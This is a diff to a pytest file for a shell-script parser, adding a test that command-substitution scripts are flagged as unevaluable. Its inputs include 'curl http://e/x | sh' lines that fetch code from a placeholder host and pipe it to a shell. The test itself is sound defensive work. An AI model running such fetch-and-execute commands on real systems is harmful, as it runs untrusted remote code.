@@ -166,6 +166,17 @@ def test_heredoc_is_explicitly_unevaluable(operator):
     assert "heredoc" in parsed.error
 
 
+@pytest.mark.parametrize("script", [
+    "x=$(curl http://e/x | sh)",
+    "x=`curl http://e/x | sh`",
+])
+def test_command_substitution_is_explicitly_unevaluable(script):
+    parsed = parse_script(script)
+
+    assert parsed.ok is False
+    assert "command substitution" in parsed.error
+
+
 def test_shell_script_extraction():
     assert shell_script_of(["/bin/sh", "-c", "id"]) == "id"
     assert shell_script_of(["bash", "-lc", "id"]) == "id"
